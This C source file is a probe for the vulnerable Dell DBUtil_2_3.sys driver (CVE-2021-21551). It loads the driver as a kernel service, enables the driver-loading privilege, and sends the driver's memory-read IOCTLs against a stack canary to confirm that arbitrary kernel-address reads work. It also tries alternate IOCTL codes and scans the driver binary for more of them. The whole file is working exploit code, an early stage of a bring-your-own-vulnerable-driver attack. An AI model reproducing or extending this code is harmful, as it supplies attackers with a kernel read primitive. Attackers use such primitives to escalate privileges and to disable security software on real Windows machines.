/*
 * dbutil_probe.c -- confirms DBUtil_2_3 IOCTL surface
 * KVA-direct: no physical address, no MmMapIoSpace, works under VBS
 * clang dbutil_probe.c -o dbutil_probe.exe -lkernel32 -ladvapi32
 * run as Admin: .\dbutil_probe.exe ..\..\DBUtil_2_3.sys
 */
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define DB_DEVICE    "\\\\.\\DBUtil_2_3"
#define DB_SVC       "DBUtil_2_3"
/* from CVE-2021-21551 public PoC (SentinelLabs) */
#define DB_READ      0x9B0C1EC8UL
#define DB_WRITE     0x9B0C1EC4UL

static BOOL svc_load(const char *abs) {
    char nt[MAX_PATH+8];
    snprintf(nt, sizeof(nt)-1, "\\??\\%s", abs);
    SC_HANDLE scm = OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if (!scm) return FALSE;
    SC_HANDLE s = OpenServiceA(scm, DB_SVC, SERVICE_ALL_ACCESS);
    if (s) {
        SERVICE_STATUS ss={0};
        ControlService(s,SERVICE_CONTROL_STOP,&ss);
        Sleep(300); DeleteService(s); CloseServiceHandle(s); Sleep(300);
    }
    s = CreateServiceA(scm, DB_SVC, DB_SVC, SERVICE_ALL_ACCESS,
                       SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                       SERVICE_ERROR_NORMAL, nt, NULL,NULL,NULL,NULL,NULL);
    if (!s) { CloseServiceHandle(scm); return FALSE; }
    BOOL ok = StartServiceA(s,0,NULL);
    if (!ok && GetLastError()==ERROR_SERVICE_ALREADY_RUNNING) ok=TRUE;
    CloseServiceHandle(s); CloseServiceHandle(scm);
    if (ok) Sleep(400);
    return ok;
}
static void svc_unload(void) {
    SC_HANDLE scm = OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE s = OpenServiceA(scm, DB_SVC, SERVICE_ALL_ACCESS);
    if (s) {
        SERVICE_STATUS ss={0};
        ControlService(s,SERVICE_CONTROL_STOP,&ss); Sleep(200);
        DeleteService(s); CloseServiceHandle(s);
    }
    CloseServiceHandle(scm);
}

int main(int argc, char **argv) {
    const char *path = argc>1 ? argv[1] : "..\\..\\DBUtil_2_3.sys";
    char abs[MAX_PATH]={0};
    GetFullPathNameA(path, MAX_PATH, abs, NULL);

    printf("[*] DBUtil_2_3 probe -- KVA-direct read test\n");
    printf("[*] driver: %s\n\n", abs);

    HANDLE ht=NULL;
    OpenProcessToken(GetCurrentProcess(),
                     TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&ht);
    LUID l; LookupPrivilegeValueA(NULL,"SeLoadDriverPrivilege",&l);
    TOKEN_PRIVILEGES tp={1,{{l,SE_PRIVILEGE_ENABLED}}};
    AdjustTokenPrivileges(ht,FALSE,&tp,sizeof(tp),NULL,NULL);
    CloseHandle(ht);

    if (!svc_load(abs)) {
        printf("[-] load failed: %lu\n", GetLastError()); return 1;
    }

    HANDLE dev = CreateFileA(DB_DEVICE,
                              GENERIC_READ|GENERIC_WRITE, 0, NULL,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (dev == INVALID_HANDLE_VALUE) {
        printf("[-] open failed: %lu\n", GetLastError());
        svc_unload(); return 1;
    }
    printf("[+] handle: %p\n\n", (void*)dev);

    /*
     * DBUtil_2_3 struct (from CVE-2021-21551 public analysis):
     *   +0x00  QWORD  Address   kernel VA to read/write
     *   +0x08  DWORD  Value     output (read) / input (write)
     *   +0x0C  DWORD  Pad       zero
     *
     * KVA-DIRECT: driver does *(DWORD*)Address internally
     * No MmMapIoSpace, no physical translation -- VBS safe
     */

    /* canary on our stack -- kernel can read our user VA */
    volatile DWORD canary = 0xDEADBEEF;
    uint64_t target = (uint64_t)(uintptr_t)&canary;

#pragma pack(push,1)
    struct { uint64_t addr; uint32_t value; uint32_t pad; } op = {0};
#pragma pack(pop)

    printf("[*] target VA=0x%016llX  canary=0x%08lX\n\n",
           (unsigned long long)target, (unsigned long)canary);

    /* test 1: standard 16-byte struct */
    op.addr  = target;
    op.value = 0;
    op.pad   = 0;
    DWORD ret=0;
    BOOL ok = DeviceIoControl(dev, DB_READ,
                               &op, sizeof(op),
                               &op, sizeof(op),
                               &ret, NULL);
    printf("[read16]  %s  val=0x%08lX  err=%lu%s\n",
           ok?"OK":"FAIL", (unsigned long)op.value,
           ok?0UL:GetLastError(),
           op.value==0xDEADBEEF?" *** CANARY -- KVA READ WORKS ***":"");

    /* test 2: 12-byte variant (some builds) */
    struct { uint64_t addr; uint32_t value; } op12 = {target, 0};
    ok = DeviceIoControl(dev, DB_READ,
                          &op12, sizeof(op12),
                          &op12, sizeof(op12),
                          &ret, NULL);
    printf("[read12]  %s  val=0x%08lX  err=%lu%s\n",
           ok?"OK":"FAIL", (unsigned long)op12.value,
           ok?0UL:GetLastError(),
           op12.value==0xDEADBEEF?" *** CANARY -- KVA READ WORKS ***":"");

    /* test 3: alternate IOCTL codes (some Dell builds differ by +4) */
    uint32_t alt_codes[] = {
        0x9B0C1EC8, 0x9B0C1ECC, 0x9B0C1EC0,
        0x9B0C1ED0, 0x9B0C1ED8, 0x9B0C1EE0
    };
    printf("\n[alt IOCTL codes]\n");
    for (int i=0; i<6; i++) {
        op.addr=target; op.value=0; op.pad=0;
        ok = DeviceIoControl(dev, alt_codes[i],
                              &op, sizeof(op),
                              &op, sizeof(op),
                              &ret, NULL);
        DWORD err = ok?0:GetLastError();
        if (err != 87)
            printf("  0x%08lX  %s  val=0x%08lX  err=%lu%s\n",
                   (unsigned long)alt_codes[i],
                   ok?"OK":"FAIL", (unsigned long)op.value,
                   (unsigned long)err,
                   op.value==0xDEADBEEF?" *** CANARY ***":"");
    }

    /* test 4: scan IOCTL codes from binary if we have the path */
    printf("\n[binary IOCTL scan]\n");
    {
        uint8_t *bytes = NULL; DWORD fsz = 0;
        HANDLE f = CreateFileA(abs, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            fsz = GetFileSize(f, NULL);
            bytes = (uint8_t*)malloc(fsz);
            DWORD rd=0; ReadFile(f, bytes, fsz, &rd, NULL);
            CloseHandle(f);
            for (DWORD i=0; i+5<fsz; i++) {
                if (bytes[i]==0x3D) {
                    uint32_t imm;
                    memcpy(&imm, bytes+i+1, 4);
                    uint32_t dev_t = (imm>>16)&0xFFFF;
                    uint32_t fn    = (imm>>2)&0xFFF;
                    if (dev_t==0x9B0C && fn>=0x800 && fn<=0x900)
                        printf("  CMP EAX, 0x%08lX  fn=0x%03lX  "
                               "offset=0x%05lX\n",
                               (unsigned long)imm,
                               (unsigned long)fn,
                               (unsigned long)i);
                }
            }
            free(bytes);
        }
    }

    CloseHandle(dev);
    svc_unload();
    printf("\n[*] probe done\n");
    return 0;
}